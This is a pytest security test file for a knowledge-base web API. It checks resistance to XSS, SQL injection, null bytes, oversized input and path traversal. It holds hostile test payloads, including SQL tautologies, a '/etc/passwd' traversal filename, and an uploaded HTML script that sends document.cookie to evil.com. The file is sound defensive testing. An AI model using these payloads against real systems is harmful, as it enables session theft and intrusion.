"""Security: injection attack resistance tests.

Covers XSS, SQL injection, path traversal, null bytes, oversized input,
emoji, and malicious content handling.
"""

import sys
import uuid
from pathlib import Path

import pytest
from sqlalchemy import select

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))

from app.config import settings
from app.models.knowledge_base import KnowledgeBase
from app.models.document import Document


def _auth(token: str) -> dict:
    return {"Authorization": f"Bearer {token}"}


# ===========================================================================
# XSS in KB name
# ===========================================================================

class TestXSSInKBName:
    @pytest.mark.asyncio
    async def test_xss_in_kb_name_no_crash(self, client, admin_token):
        """KB name with <script> tag → 200, no crash, name stored as-is."""
        r = await client.post("/api/kb", json={
            "name": '<script>alert(1)</script>',
            "description": "xss test",
        }, headers=_auth(admin_token))
        assert r.status_code == 201
        data = r.json()
        assert "<script>" in data["name"]

        # Retrieve and verify persistence
        r2 = await client.get(f"/api/kb/{data['id']}", headers=_auth(admin_token))
        assert r2.status_code == 200
        assert "<script>" in r2.json()["name"]

    @pytest.mark.asyncio
    async def test_emoji_in_kb_name(self, client, admin_token):
        """KB name with emoji → 200, stored correctly."""
        r = await client.post("/api/kb", json={
            "name": "测试知识库 \U0001f680\U0001f4da\U00002705",
            "description": "emoji test",
        }, headers=_auth(admin_token))
        assert r.status_code == 201
        data = r.json()
        assert "\U0001f680" in data["name"]


# ===========================================================================
# SQL injection in search queries
# ===========================================================================

class TestSQLInjectionSearch:
    @pytest.mark.asyncio
    async def test_sql_injection_or_1eq1(self, client, admin_token, test_kb):
        """Search with classic SQL injection tautology → 200, no crash."""
        payload = "' OR '1'='1"
        r = await client.post("/api/retrieval/search", json={
            "query": payload,
            "kb_id": test_kb["id"],
        }, headers=_auth(admin_token))
        assert r.status_code == 200
        data = r.json()
        assert isinstance(data, list)

    @pytest.mark.asyncio
    async def test_sql_injection_semicolon(self, client, admin_token, test_kb):
        """Search with semicolon-separated statement → 200, no crash."""
        payload = "test'; SELECT 1; --"
        r = await client.post("/api/retrieval/search", json={
            "query": payload,
            "kb_id": test_kb["id"],
        }, headers=_auth(admin_token))
        assert r.status_code == 200
        # KBs still accessible — tables intact
        r2 = await client.get("/api/kb", headers=_auth(admin_token))
        assert r2.status_code == 200

    @pytest.mark.asyncio
    async def test_null_byte_in_query(self, client, admin_token, test_kb):
        """Search query with null byte → 200, no crash."""
        r = await client.post("/api/retrieval/search", json={
            "query": "test\u0000injection",
            "kb_id": test_kb["id"],
        }, headers=_auth(admin_token))
        assert r.status_code == 200

    @pytest.mark.asyncio
    async def test_oversized_query(self, client, admin_token, test_kb):
        """Search query of 10000 chars → 200, no crash."""
        long_query = "A" * 10000
        r = await client.post("/api/retrieval/search", json={
            "query": long_query,
            "kb_id": test_kb["id"],
        }, headers=_auth(admin_token))
        assert r.status_code in (200, 422)


# ===========================================================================
# Path traversal in upload filename
# ===========================================================================

class TestPathTraversalUpload:
    @pytest.mark.asyncio
    async def test_path_traversal_filename(self, client, admin_token, test_kb):
        """Upload with ../../ traversal in filename → safe, file stays in upload_dir."""
        traversal_name = "../../../etc/passwd.txt"
        files = {"file": (traversal_name, b"malicious", "text/plain")}
        r = await client.post("/api/documents/upload",
            files=files, data={"kb_id": test_kb["id"]},
            headers=_auth(admin_token))
        assert r.status_code == 200
        doc = r.json()

        # Verify the saved file path is inside upload_dir
        from app.database import async_session
        async with async_session() as db:
            result = await db.execute(
                select(Document).where(Document.id == doc["id"])
            )
            db_doc = result.scalar_one_or_none()
        if db_doc and db_doc.file_path:
            actual = Path(db_doc.file_path).resolve()
            upload = settings.upload_dir.resolve()
            assert str(actual).startswith(str(upload)), (
                f"Path traversal: {actual} is outside {upload}"
            )

    @pytest.mark.asyncio
    async def test_malicious_html_upload(self, client, admin_token, test_kb):
        """Upload HTML-as-markdown → handled as text, not executed."""
        html_content = (
            b"<html><script>"
            b"fetch('https://evil.com/steal?c='+document.cookie)"
            b"</script><body>malicious</body></html>"
        )
        files = {"file": ("evil.md", html_content, "text/markdown")}
        r = await client.post("/api/documents/upload",
            files=files, data={"kb_id": test_kb["id"]},
            headers=_auth(admin_token))
        assert r.status_code == 200
        doc = r.json()
        assert doc["status"] in ("pending", "uploaded", "parsing", "completed", "failed")


# ===========================================================================
# SQL injection in login
# ===========================================================================

class TestLoginInjection:
    @pytest.mark.asyncio
    async def test_sql_injection_username(self, client):
        """Login with SQL injection payload in username → 401, no bypass."""
        r = await client.post("/api/auth/login", json={
            "username": "' OR '1'='1",
            "password": "' OR '1'='1",
        })
        assert r.status_code == 401
        detail = r.json().get("detail", "")
        assert "INVALID_CREDENTIALS" in detail


# ===========================================================================
# SQL injection in conversation title
# ===========================================================================

class TestConversationTitleInjection:
    @pytest.mark.asyncio
    async def test_injected_conv_title_no_crash(self, client, admin_token, test_kb):
        """Conversation with SQL-injected title → 200 on retrieval, no crash."""
        from app.models.conversation import Conversation

        cid = str(uuid.uuid4())
        from app.database import async_session
        async with async_session() as db:
            conv = Conversation(
                id=cid,
                title="test'; SELECT * FROM sqlite_master; --",
                kb_id=test_kb["id"],
                user_id=None,
            )
            db.add(conv)
            await db.commit()

        r = await client.get("/api/conversations", headers=_auth(admin_token))
        assert r.status_code == 200
        convs = r.json()
        assert isinstance(convs, list)
